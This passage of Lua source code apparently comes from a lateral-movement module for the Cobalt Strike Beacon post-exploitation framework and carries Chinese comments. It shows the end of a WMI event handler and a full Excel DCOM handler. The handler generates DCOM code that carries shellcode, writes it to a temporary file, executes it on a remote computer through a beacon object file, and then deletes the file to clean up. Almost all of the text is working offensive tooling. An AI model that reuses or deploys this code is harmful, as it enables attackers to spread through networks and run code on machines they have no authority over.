    beacon_bof_execute(params.bid, script_resource("wmi_event.o"), args)

    -- 清理
    os.remove(temp_file)
end

-- Excel DCOM处理
function MoveKit.handle_excel_dcom(params, shellcode, sharptask)
    -- 生成Excel DCOM代码
    local content = payloadgen.generate_excel_dcom(shellcode, params)

    -- 写入临时文件
    local temp_file = os.tmpname()
    local f = io.open(temp_file, "w")
    f:write(content)
    f:close()

    -- 执行Excel DCOM
    local args = bof_pack("zz", temp_file, params.computername)
    beacon_bof_execute(params.bid, script_resource("excel_dcom.o"), args)

    -- 清理
    os.remove(temp_file)
end

return MoveKit
